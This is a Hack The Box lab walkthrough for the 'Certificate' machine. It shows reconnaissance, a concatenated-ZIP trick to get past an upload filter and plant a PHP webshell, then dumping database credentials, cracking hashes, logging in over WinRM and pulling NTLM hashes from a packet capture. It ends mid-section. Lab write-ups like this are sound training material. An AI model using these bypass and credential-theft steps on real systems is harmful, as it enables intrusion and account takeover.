# Certificate

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.71:53
Open 10.10.11.71:80
Open 10.10.11.71:88
Open 10.10.11.71:135
Open 10.10.11.71:139
Open 10.10.11.71:389
Open 10.10.11.71:445
Open 10.10.11.71:464
Open 10.10.11.71:593
Open 10.10.11.71:636
Open 10.10.11.71:3268
Open 10.10.11.71:3269
Open 10.10.11.71:5985
Open 10.10.11.71:9389
Open 10.10.11.71:49691
Open 10.10.11.71:49693
Open 10.10.11.71:49692
Open 10.10.11.71:49709
Open 10.10.11.71:49716
Open 10.10.11.71:49735
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.71

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
|_http-title: Did not follow redirect to http://certificate.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-07-11 17:23:53Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-07-11T17:25:27+00:00; +8h00m03s from scanner time.
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
|_ssl-date: 2025-07-11T17:25:29+00:00; +8h00m02s from scanner time.
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
|_ssl-date: 2025-07-11T17:25:27+00:00; +8h00m03s from scanner time.
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
|_ssl-date: 2025-07-11T17:25:29+00:00; +8h00m02s from scanner time.
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49691/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
49693/tcp open  msrpc         syn-ack Microsoft Windows RPC
49709/tcp open  msrpc         syn-ack Microsoft Windows RPC
49716/tcp open  msrpc         syn-ack Microsoft Windows RPC
49735/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-07-11T17:24:48
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50770/tcp): CLEAN (Timeout)
|   Check 2 (port 17756/tcp): CLEAN (Timeout)
|   Check 3 (port 43669/udp): CLEAN (Timeout)
|   Check 4 (port 5596/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 8h00m02s, deviation: 0s, median: 8h00m01s
```
:::

## DNS

```bash
└─$ dnsrecon -d certificate.htb -n 10.10.11.71 --tcp
[*] std: Performing General Enumeration against: certificate.htb...
[-] DNSSEC is not configured for certificate.htb
[*]      SOA dc01.certificate.htb 10.10.11.71
[*]      NS dc01.certificate.htb 10.10.11.71
[*]      A certificate.htb 10.10.11.71
[*] Enumerating SRV Records
[+]      SRV _gc._tcp.certificate.htb dc01.certificate.htb 10.10.11.71 3268
[+]      SRV _kerberos._udp.certificate.htb dc01.certificate.htb 10.10.11.71 88
[+]      SRV _ldap._tcp.certificate.htb dc01.certificate.htb 10.10.11.71 389
[+]      SRV _kerberos._tcp.certificate.htb dc01.certificate.htb 10.10.11.71 88
[+]      SRV _ldap._tcp.ForestDNSZones.certificate.htb dc01.certificate.htb 10.10.11.71 389
[+]      SRV _ldap._tcp.dc._msdcs.certificate.htb dc01.certificate.htb 10.10.11.71 389
[+]      SRV _ldap._tcp.gc._msdcs.certificate.htb dc01.certificate.htb 10.10.11.71 3268
[+]      SRV _kpasswd._tcp.certificate.htb dc01.certificate.htb 10.10.11.71 464
[+]      SRV _kerberos._tcp.dc._msdcs.certificate.htb dc01.certificate.htb 10.10.11.71 88
[+]      SRV _ldap._tcp.pdc._msdcs.certificate.htb dc01.certificate.htb 10.10.11.71 389
[+]      SRV _kpasswd._udp.certificate.htb dc01.certificate.htb 10.10.11.71 464
[+] 11 Records Found
```

```ini
└─$ dig ANY certificate.htb @10.10.11.71

; <<>> DiG 9.19.21-1-Debian <<>> ANY certificate.htb @10.10.11.71
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 9920
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4000
;; QUESTION SECTION:
;certificate.htb.               IN      ANY

;; ANSWER SECTION:
certificate.htb.        600     IN      A       10.10.11.71
certificate.htb.        3600    IN      NS      dc01.certificate.htb.
certificate.htb.        3600    IN      SOA     dc01.certificate.htb. hostmaster.certificate.htb. 164 900 600 86400 3600

;; ADDITIONAL SECTION:
dc01.certificate.htb.   3600    IN      A       10.10.11.71

;; Query time: 72 msec
;; SERVER: 10.10.11.71#53(10.10.11.71) (TCP)
;; WHEN: Fri Jul 11 05:35:58 EDT 2025
;; MSG SIZE  rcvd: 142
```

## HTTP (80)

Not much from the initial pages. Website is written in PHP, potential user **Charlie Barber**. 

![Writeup.png](/assets/pentest/htb/certificate/Writeup.png)

There's Login/Register available for website. [http://certificate.htb/register.php](http://certificate.htb/register.php)

We can sign up as a Student or Teacher.

![Writeup-1.png](/assets/pentest/htb/certificate/Writeup-1.png)

As a student you have access to **Courses** and each can be viewed by ID: [http://certificate.htb/course-details.php?id=1](http://certificate.htb/course-details.php?id=1)

Passive enum:
```bash
└─$ feroxbuster -u http://certificate.htb/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x php --thorough -n -D -C 404,403,400 --dont-scan js,css,png,jpeg,jpg,gif
200      GET      230l      663w     9412c http://certificate.htb/login.php
200      GET      256l      786w    10916c http://certificate.htb/register.php
302      GET        0l        0w        0c http://certificate.htb/course-details.php => login.php
200      GET      263l      754w    10605c http://certificate.htb/contacts.php
200      GET      565l     1566w    21940c http://certificate.htb/blog.php
200      GET      372l     1136w    14826c http://certificate.htb/about.php
200      GET      582l     1643w    22420c http://certificate.htb/index.php
200      GET      582l     1643w    22420c http://certificate.htb/
200      GET      372l     1136w    14826c http://certificate.htb/About.php
200      GET        0l        0w        0c http://certificate.htb/DB.php
200      GET      582l     1643w    22420c http://certificate.htb/Index.php
200      GET      565l     1566w    21940c http://certificate.htb/Blog.php
200      GET      230l      663w     9412c http://certificate.htb/Login.php
302      GET        0l        0w        0c http://certificate.htb/courses.php => login.php
200      GET        0l        0w        0c http://certificate.htb/db.php
200      GET       71l      231w     2955c http://certificate.htb/footer.php
503      GET       11l       44w      404c http://certificate.htb/examples
200      GET       46l      106w     1848c http://certificate.htb/header.php
302      GET        0l        0w        0c http://certificate.htb/logout.php => login.php
301      GET        9l       30w      343c http://certificate.htb/static => http://certificate.htb/static/
302      GET        0l        0w        0c http://certificate.htb/upload.php => login.php
```

You can enroll into the course [http://certificate.htb/course-details.php?id=1&action=enroll](http://certificate.htb/course-details.php?id=1&action=enroll)

In course details `upload.php` is revealed: [http://certificate.htb/upload.php?s_id=5](http://certificate.htb/upload.php?s_id=5)

### File Upload

![Writeup-2.png](/assets/pentest/htb/certificate/Writeup-2.png)

So they only accept `PDF, DOCX, PPTX, XLSX`, but we can send a `ZIP` too; however this zip file may only contain the above extensions otherwise upload fails.

```bash
└─$ zip -r test.zip /home/woyag/Desktop/Rooms/Noter/policy.pdf
  adding: home/woyag/Desktop/Rooms/Noter/policy.pdf (deflated 17%)
```

File uploaded successfully!. You can check your uploaded assignment file(in case you want to re-upload it or do some changes) [HERE](http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/home/woyag/Desktop/Rooms/Noter/policy.pdf)

[http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/home/woyag/Desktop/Rooms/Noter/policy.pdf](http://certificate.htb/static/uploads/8ad6b1453a685cd6a629959dcfb5039d/home/woyag/Desktop/Rooms/Noter/policy.pdf)

![Writeup-3.png](/assets/pentest/htb/certificate/Writeup-3.png)

Our upload directory seems to be fixed at `8ad6b1453a685cd6a629959dcfb5039d` and then path to zipped files.

![Writeup-4.png](/assets/pentest/htb/certificate/Writeup-4.png)

Filename tampering didn't work (like injecting Null byte in filename), the only accepted format was ZIP and listed extensions. Some mechanism is used to scan zip files to allow only whitelisted extensions..

### Double Trouble

[Evasive ZIP Concatenation: Trojan Targets Windows Users](https://perception-point.io/blog/evasive-concatenated-zip-trojan-targets-windows-users/)

```bash
└─$ mkdir samples/1 samples/2 -p
└─$ echo -e '%PDF-1.1\n1 0 obj\nTEST1\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF' > ./samples/1/sample.pdf
└─$ echo -e '%PDF-1.1\n1 0 obj\nTEST2\n<<>>\nendobj\ntrailer\n<<>>\n%%EOF' > ./samples/2/sample.pdf
└─$ file samples/*/*.pdf
samples/1/sample.pdf: PDF document, version 1.1
samples/2/sample.pdf: PDF document, version 1.1
└─$ zip -r sample1.zip samples/1
  adding: samples/1/ (stored 0%)
  adding: samples/1/sample.pdf (deflated 9%)

└─$ zip -r sample2.zip samples/2
  adding: samples/2/ (stored 0%)
  adding: samples/2/sample.pdf (deflated 9%)

└─$ cat sample1.zip sample2.zip > sample.zip
└─$ binwalk sample.zip

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v1.0 to extract, name: samples/1/
68            0x44            Zip archive data, at least v2.0 to extract, compressed size: 49, uncompressed size: 54, name: samples/1/sample.pdf
365           0x16D           End of Zip archive, footer length: 22
387           0x183           Zip archive data, at least v1.0 to extract, name: samples/2/
455           0x1C7           Zip archive data, at least v2.0 to extract, compressed size: 49, uncompressed size: 54, name: samples/2/sample.pdf
752           0x2F0           End of Zip archive, footer length: 22

# If uploaded is a success
└─$ zip -r sample1.zip samples/1/sample.pdf
  adding: samples/1/sample.pdf (deflated 9%)

# Create another zip
└─$ zip -r sample2.zip samples/2/sample.pdf
  adding: samples/2/sample.pdf (deflated 9%)

# 2 zip files in 1
└─$ cat sample1.zip sample2.zip > sample.zip
```

If uploaded the 2 zip file is unpacked into separate directories.

Embed malicious file into extra zip file, recreate 2 zip and upload
```bash
└─$ zip -r sample2.zip ./webshell.php
└─$ cat sample1.zip sample2.zip > sample.zip
└─$ curl 'http://certificate.htb/upload.php?s_id=5' -b 'PHPSESSID=a481ftc825lu5hc0jdjvgej57a' -F 'info=How%20to%20be%20the%20employee%20of%20the%20month!%20-%20Quizz-1' -F 'quizz_id=5' -F 'file=@sample.zip;type=application/zip' # -x http://0:8080
```

### RCE

Try to access the PHP file:

![Writeup-5.png](/assets/pentest/htb/certificate/Writeup-5.png)

`WinRAR` was used to extract the upload zip files.

![Writeup-6.png](/assets/pentest/htb/certificate/Writeup-6.png)

Read database details:
```php
// CMD> type "C:\xampp\htdocs\certificate.htb\db.php"
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>

// CMD> wmic useraccount get name
Name           
Administrator  
Guest          
krbtgt         
Kai.X          
Sara.B         
John.C         
Aya.W          
Nya.S          
Maya.K         
Lion.SK        
Eva.F          
Ryan.K         
akeder.kh      
kara.m         
Alex.D         
karol.s        
saad.m         
xamppuser  
```

Password doesn't seem to work on anyone.
```bash
└─$ nano usernames.txt
└─$ sed -i 's/ //g' usernames.txt
└─$ netexec smb dc01.certificate.htb -u usernames.txt -p 'cert!f!c@teDBPWD' --continue-on-success
```

```bash
// CMD> "C:\xampp\mysql\bin\mysql.exe" -u"certificate_webapp_user" -p"cert!f!c@teDBPWD" -e "SHOW DATABASES;"
Database
certificate_webapp_db
information_schema
test

// CMD> "C:\xampp\mysql\bin\mysql.exe" -u"certificate_webapp_user" -p"cert!f!c@teDBPWD" -D "certificate_webapp_db" -e "SHOW TABLES;"
Tables_in_certificate_webapp_db
course_sessions
courses
users
users_courses

// CMD> "C:\xampp\mysql\bin\mysql.exe" --table -u"certificate_webapp_user" -p"cert!f!c@teDBPWD" -D "certificate_webapp_db" -e "SELECT * FROM users;"
+----+------------+--------------+------------+---------------------------+--------------------------------------------------------------+---------------------+---------+-----------+
| id | first_name | last_name    | username   | email                     | password                                                     | created_at          | role    | is_active |
+----+------------+--------------+------------+---------------------------+--------------------------------------------------------------+---------------------+---------+-----------+
|  1 | Lorra      | Armessa      | Lorra.AAA  | lorra.aaa@certificate.htb | $2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG | 2024-12-23 12:43:10 | teacher |         1 |
|  6 | Sara       | Laracrof     | Sara1200   | sara1200@gmail.com        | $2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK | 2024-12-23 12:47:11 | teacher |         1 |
|  7 | John       | Wood         | Johney     | johny009@mail.com         | $2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq | 2024-12-23 13:18:18 | student |         1 |
|  8 | Havok      | Watterson    | havokww    | havokww@hotmail.com       | $2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti | 2024-12-24 09:08:04 | teacher |         1 |
|  9 | Steven     | Roman        | stev       | steven@yahoo.com          | $2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2 | 2024-12-24 12:05:05 | student |         1 |
| 10 | Sara       | Brawn        | sara.b     | sara.b@certificate.htb    | $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6 | 2024-12-25 21:31:26 | admin   |         1 |
| 12 | TestName   | TestLastname | let@me.in  | let@me.in                 | $2y$04$su42nmfupofi3sytSBJH0uGIqHA6r7JfbDxLQps/fA40qHOqubEom | 2025-07-11 10:42:54 | student |         1 |
| 13 | TestNmae   | TestLastNmae | 2let@me.in | 2let@me.in                | $2y$04$w5/ZE56PgInF15NROMNF0eJDow3TtSFj2ix3LGV7RtPqzONq5nQei | 2025-07-11 10:51:24 | teacher |         0 |
+----+------------+--------------+------------+---------------------------+--------------------------------------------------------------+---------------------+---------+-----------+
```

`admin` role is desirable to have, let's try cracking password:


```powershell
➜ notepad .\hashes.txt # $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6
➜ .\john-1.9.0-jumbo-1-win64\run\john.exe .\hashes.txt --wordlist=.\rockyou.txt
Warning: detected hash type "bcrypt", but the string is also recognized as "bcrypt-opencl"
Blink182         (?)
```

## WinRM

```bash
└─$ netexec winrm dc01.certificate.htb -u 'Sara.B' -p 'Blink182'
WINRM       10.10.11.71     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:certificate.htb)
WINRM       10.10.11.71     5985   DC01             [+] certificate.htb\Sara.B:Blink182 (Pwn3d!)

└─$ evil-winrm -i dc01.certificate.htb -u 'Sara.B' -p 'Blink182'
*Evil-WinRM* PS C:\Users\Sara.B\Documents> whoami /all

User Name          SID
================== =============================================
certificate\sara.b S-1-5-21-515537669-4223687196-3249690583-1109

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
CERTIFICATE\Help Desk                      Group            S-1-5-21-515537669-4223687196-3249690583-1110 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

User.txt not pwned.

There are some files in Documents:
```powershell
*Evil-WinRM* PS C:\Users\Sara.B> tree /f /a
Folder PATH listing
Volume serial number is 7E12-22F9
C:.
+---3D Objects
+---Contacts
+---Desktop
+---Documents
|   \---WS-01
|           Description.txt
|           WS-01_PktMon.pcap
|
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
+---Saved Games
+---Searches
\---Videos
```

## WS-01

```powershell
*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> cat Des*
The workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!

*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> nslookup WS-01
Server:  localhost
Address:  127.0.0.1

Name:    WS-01.certificate.htb
Address:  192.168.56.128

*Evil-WinRM* PS C:\Users\Sara.B\Documents\WS-01> download WS-01_PktMon.pcap
```

### NTLM

The attempt to recover crack NTLM hashes was not successful.
```bash
# curl -LOs https://raw.githubusercontent.com/mlgualtieri/NTLMRawUnHide/refs/heads/master/NTLMRawUnHide.py
└─$ py /opt/scripts/utils/NTLMRawUnHide.py -i WS-01_PktMon.pcap | grep :: # | xclip -sel clip
Administrator::WS-01:0f18018782d74f81:3ff29ba4b51e86ed1065c438b6713f28:01010000000000000588e3da922edb012a49d5aaa4eeea0c00000000020016004300450052005400490046004900430041005400450001000800440043003000310004001e00630065007200740069006600690063006100740065002e006800740062000300280044004300300031002e00630065007200740069006600690063006100740065002e0068007400620005001e00630065007200740069006600690063006100740065002e00680074006200070008000588e3da922edb0106000400020000000800300030000000000000000000000000300000dc8f08a3fced11be77c988c86f35837e8ec242f6f5e1d65ec5247e3a87d8fe580a001000000000000000000000000000000000000900120063006900660073002f0044004300300031000000000000000000
...
➜ .\john-1.9.0-jumbo-1-win64\run\john.exe .\hashes.txt --wordlist=.\rockyou.txt
Warning: detected hash type "netntlmv2", but the string is also recognized as "ntlmv2-opencl"
Use the "--format=ntlmv2-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 23 password hashes with 23 different salts (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:30 22.77% (ETA: 16:09:20) 0g/s 115098p/s 2647Kc/s 2647KC/s susua2..surnilatac
0g 0:00:02:33 DONE (2025-
```

### Kerberos

There's also Kerberos traffic along NTLM.

![Writeup-7.png](/assets/pentest/htb/certificate/Writeup-7.png)

I found similar tool for Kerberos [Krb5RoastParser](https://github.com/jalvarezz13/Krb5RoastParser)

| Kerberos Message       | Purpose                                                 | Pre-Auth Involved | Contains Encrypted Data             | Password Recovery Feasibility                                                                                                                                                                                                                                                                       | Type of Encrypted Data                          | Common Attack Method                                                                                                                   | User Interaction Required  |
| ---------------------- | ------------------------------------------------------- | ----------------- | ----------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------- | -------------------------- |
| AS-REQ (No Pre-Auth)   | Initial authentication request to KDC                   | No                | No                                  | Not useful for password recovery                                                                                                                                                                                                                                                                    | N/A                                             | N/A                                                                                                                                    | Client sends request       |
| AS-REQ (With Pre-Auth) | Initial authentication request with encrypted timestamp | Yes               | Encrypted timestamp with user's key | Can be captured for brute-force attacks, but difficult[1](https://www.prosec-networks.com/en/blog/kerberos-attacks/)[2](https://wentzwu.com/2022/08/29/kerberos-pre-authentication/)[3](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/ae60c948-fda8-45c2-b1d1-a71b484dd1f7) | Encrypted timestamp (with user's password hash) | Pre-auth brute-force[4](https://github.com/ropnop/kerbrute)[5](https://www.thehacker.recipes/ad/movement/kerberos/pre-auth-bruteforce) | Client sends request       |
| AS-REP (No Pre-Auth)   | KDC response to client (no pre-auth required)           | No                | Encrypted part with user's key      | Highly useful (AS-REP roasting)[6](https://labs.lares.com/fear-kerberos-pt1/)[7](https://blog.netwrix.com/2022/11/03/cracking_ad_password_with_as_rep_roasting/)[8](https://www.semperis.com/blog/as-rep-roasting-explained/)                                                                       | Encrypted data with user's password hash        | AS-REP roasting                                                                                                                        | No user interaction needed |
| AS-REP (With Pre-Auth) | KDC response after successful pre-auth                  | Yes               | Encrypted part with user's key      | Not useful for AS-REP roasting                                                                                                                                                                                                                                                                      | Encrypted data with user's password hash        | N/A                                                                                                                                    | No user interaction needed |
| TGS-REP                | KDC response with service ticket                        | N/A               | Encrypted ticket with service key   | Useful for service account password recovery (Kerberoasting)[9](https://www.ravenswoodtechnology.com/protecting-active-directory-from-kerberoasting/)                                                                                                                                               | Encrypted ticket with service or user key       | TGS-REP roasting                                                                                                                       | No user interaction needed |

```bash
